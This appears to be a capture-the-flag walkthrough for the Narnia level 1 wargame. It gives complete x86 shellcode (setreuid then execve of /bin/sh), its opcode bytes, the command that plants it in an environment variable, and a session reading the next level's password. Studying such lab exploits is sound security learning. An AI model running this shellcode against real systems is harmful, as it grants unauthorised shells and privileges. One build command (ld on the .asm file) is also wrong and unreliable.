@@ -1,0 +1,81 @@
+This challenge requires an environment variable called EGG.
+The program flow jumps to the address containing the value of EGG when ret()
+is called, Since getenv() returns the address containing the value of EGG :P
+We could load EGG with shellcode that gets us a shell and run the binary.
+A very basic shellcode execution exercise.
+
+The stack is executable, this can be confirmed with a checksec command.
+
+	checksec ./narnia1
+	
+	Arch:     i386-32-little
+	RELRO:    Partial RELRO
+	Stack:    No canary found
+	NX:       NX unknown - GNU_STACK missing
+	PIE:      No PIE (0x8048000)
+	Stack:    Executable
+	RWX:      Has RWX segments
+
+We need shellcode that elevates the uid to narnia2 and spawns in a shell.
+A very good manual on how to write shellcode: [Shellcode Guide](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)
+
+The following assembly does that for us:
+
+	BITS 32
+
+	; setreuid(uid_t ruid, uid_t euid)
+	 xor eax, eax
+	 xor ebx, ebx
+	 xor ecx, ecx	; setting eax, ebx and ecx to 0. 
+	
+	  mov al, 70        ; put 70 into eax, since setreuid is syscall #70
+	  mov bx, 0x36b2      ; put 14002 into ebx, to set real uid to narnia2
+	  mov cx, 0x36b2      ; put 14002 into ecx, to set effective uid to narnia2
+	  int 0x80          ; Call the kernel to make the system call happen
+	  jmp short two     ; Jump down to the bottom for the call trick
+	
+	one:
+	  pop ebx           ; pop the "return address" from the stack
+	                    ; to put the address of the string into ebx
+	
+	; execve(const char *filename, char *const argv [], char *const envp[])
+	  xor eax, eax      ; put 0 into eax
+	  mov [ebx+7], al   ; put the 0 from eax where the X is in the string
+	                    ; ( 7 bytes offset from the beginning)
+	  mov [ebx+8], ebx  ; put the address of the string from ebx where the
+	                    ; AAAA is in the string ( 8 bytes offset)
+	  mov [ebx+12], eax ; put the a NULL address (4 bytes of 0) where the
+	                    ; BBBB is in the string ( 12 bytes offset)
+	  mov al, 11        ; Now put 11 into eax, since execve is syscall #11
+	  lea ecx, [ebx+8]  ; Load the address of where the AAAA was in the string
+	                    ; into ecx
+	  lea edx, [ebx+12] ; Load the address of where the BBBB was in the string
+	                    ; into edx
+	  int 0x80          ; Call the kernel to make the system call happen
+	
+	two:
+	  call one          ; Use a call to get back to the top and get the
+	  db '/bin/shXAAAABBBB' ; address of this string
+
+Compiling and extracting the opcodes we get our shellcode:
+
+	$ nasm -f elf32 shellcode.asm
+	$ ld -m elf_i386 shellcode.asm
+
+
+	\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb2\x36\x66\xb9\xb2\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42
+
+To set the environment variable EGG to our shellcode:
+
+	$ echo -e "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\x66\xbb\xb2\x36\x66\xb9\xb2\x36\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42" > shellcode.bin
+	$ export EGG=$(cat shellcode.bin)
+
+Now when we run our binary, we get an elevated shell:
+	
+	narnia1@gibson:/tmp/<temporary folder>$ /narnia/narnia1
+	Trying to execute EGG!
+	$ whoami
+	narnia2
+	$ cat /etc/narnia_pass/narnia2
+	<password for next level>
+
